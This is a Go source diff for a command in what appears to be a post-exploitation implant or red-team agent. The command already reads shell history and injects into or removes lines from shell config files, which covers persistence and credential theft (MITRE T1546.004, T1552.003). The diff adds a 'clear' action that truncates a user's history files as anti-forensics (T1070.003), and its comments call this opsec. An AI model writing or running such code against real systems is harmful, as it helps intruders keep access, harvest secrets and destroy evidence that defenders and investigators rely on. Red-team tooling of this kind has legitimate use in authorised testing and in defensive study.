@@ -17,7 +17,7 @@ type ShellConfigCommand struct{}
 
 func (c *ShellConfigCommand) Name() string { return "shell-config" }
 func (c *ShellConfigCommand) Description() string {
-	return "Read shell history, list/read/inject/remove shell config files (T1546.004, T1552.003)"
+	return "Read shell history, list/read/inject/remove/clear shell config files (T1546.004, T1552.003, T1070.003)"
 }
 
 type shellConfigArgs struct {
@@ -93,8 +93,10 @@ func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
 		return shellInject(args)
 	case "remove":
 		return shellRemove(args)
+	case "clear":
+		return shellClear(args)
 	default:
-		return errorf("Unknown action: %s\nAvailable: history, list, read, inject, remove", args.Action)
+		return errorf("Unknown action: %s\nAvailable: history, list, read, inject, remove, clear", args.Action)
 	}
 }
 
@@ -343,4 +345,71 @@ func shellRemove(args shellConfigArgs) structs.CommandResult {
 	}
 
 	return successf("Removed %d line(s) from %s", removed, path)
+}
+
+// shellClear securely wipes shell history files for anti-forensics (T1070.003).
+// Reads the file, zeros the memory, then truncates the file to zero bytes.
+// If a specific file is given, only that file is cleared; otherwise all history files.
+func shellClear(args shellConfigArgs) structs.CommandResult {
+	homeDir, err := getHomeDir(args.User)
+	if err != nil {
+		return errorf("Error: %v", err)
+	}
+
+	// Determine which files to clear
+	var targets []string
+	if args.File != "" {
+		// Clear a specific file
+		path := args.File
+		if !filepath.IsAbs(path) {
+			path = filepath.Join(homeDir, path)
+		}
+		targets = append(targets, path)
+	} else {
+		// Clear all history files
+		for _, f := range shellHistoryFiles {
+			targets = append(targets, filepath.Join(homeDir, f))
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString("=== Shell History Clear ===\n\n")
+	cleared := 0
+
+	for _, path := range targets {
+		info, err := os.Stat(path)
+		if err != nil {
+			continue // file doesn't exist, skip
+		}
+
+		origSize := info.Size()
+		if origSize == 0 {
+			continue // already empty
+		}
+
+		// Read content to zero it in memory (opsec)
+		content, err := os.ReadFile(path)
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("  [-] %s: read error: %v\n", path, err))
+			continue
+		}
+		structs.ZeroBytes(content) // opsec: zero history content in memory
+
+		// Truncate the file to zero bytes
+		if err := os.Truncate(path, 0); err != nil {
+			sb.WriteString(fmt.Sprintf("  [-] %s: truncate error: %v\n", path, err))
+			continue
+		}
+
+		sb.WriteString(fmt.Sprintf("  [+] %s: cleared (%d bytes)\n", path, origSize))
+		cleared++
+	}
+
+	if cleared == 0 {
+		sb.WriteString("  No history files found or all already empty.\n")
+	} else {
+		sb.WriteString(fmt.Sprintf("\n  %d file(s) cleared.\n", cleared))
+	}
+
+	return successResult(sb.String())
 }
